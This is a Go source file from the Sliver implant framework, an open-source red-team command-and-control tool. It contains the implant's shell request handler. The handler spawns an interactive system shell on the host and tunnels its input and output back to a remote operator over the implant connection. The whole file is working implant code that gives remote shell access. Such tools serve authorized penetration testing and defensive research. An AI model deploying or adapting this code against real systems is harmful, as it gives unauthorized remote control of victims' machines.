package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"io"

	"github.com/bishopfox/sliver/implant/sliver/shell"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell, err := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	if systemShell == nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to get system shell")
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	// At this point, command is already started by StartInteractive
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to spawn! err: %v", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	} else {
		// {{if .Config.Debug}}
		log.Printf("[shell] Process spawned!")
		// {{end}}
	}

	tunnel := transports.NewTunnel(
		shellReq.TunnelID,
		systemShell.Stdin,
		systemShell.Stdout,
		systemShell.Stderr,
	)
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string, err error) {
		// {{if .Config.Debug}}
		log.Printf("[shell] Closing tunnel request %d (%s). Err: %v", tunnel.ID, reason, err)
		// {{end}}

		systemShell.Stop()

		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	for _, rc := range tunnel.Readers {
		if rc == nil {
			continue
		}
		go func(outErr io.ReadCloser) {
			tWriter := tunnelWriter{
				conn: connection,
				tun:  tunnel,
			}
			// {{if .Config.Debug}}
			log.Printf("[shell] tWriter: %v outErr: %v", tWriter, outErr)
			// {{end}}
			_, err := io.Copy(tWriter, outErr)

			if err != nil {
				cleanup("io error", err)
				return
			}
			err = systemShell.Wait() // sync wait, since we already locked in io.Copy, and it will release once it's done
			if err != nil {
				cleanup("shell wait error", err)
				return
			}
			if systemShell.Command.ProcessState != nil {
				if systemShell.Command.ProcessState.Exited() {
					cleanup("process terminated", nil)
					return
				}
			}
			if err == io.EOF {
				cleanup("EOF", err)
				return
			}
		}(rc)
	}

	// {{if .Config.Debug}}
	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
